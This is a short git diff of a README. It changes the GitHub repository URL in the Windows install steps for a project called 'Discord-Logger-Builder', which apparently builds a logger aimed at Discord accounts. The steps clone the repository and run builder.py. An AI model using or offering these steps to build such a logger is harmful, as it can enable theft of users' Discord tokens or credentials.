@@ -10,7 +10,7 @@ The script has been tested in python 3.8.6-3.10.0, on Windows 10/11. This script
 
 Windows:
 ```
-git clone https://github.com/LocalsGitHub/Discord-Logger-Builder.git
+git clone https://github.com/qualk/Discord-Logger-Builder.git
 cd Discord-Logger-Builder
 py builder.py
 ```
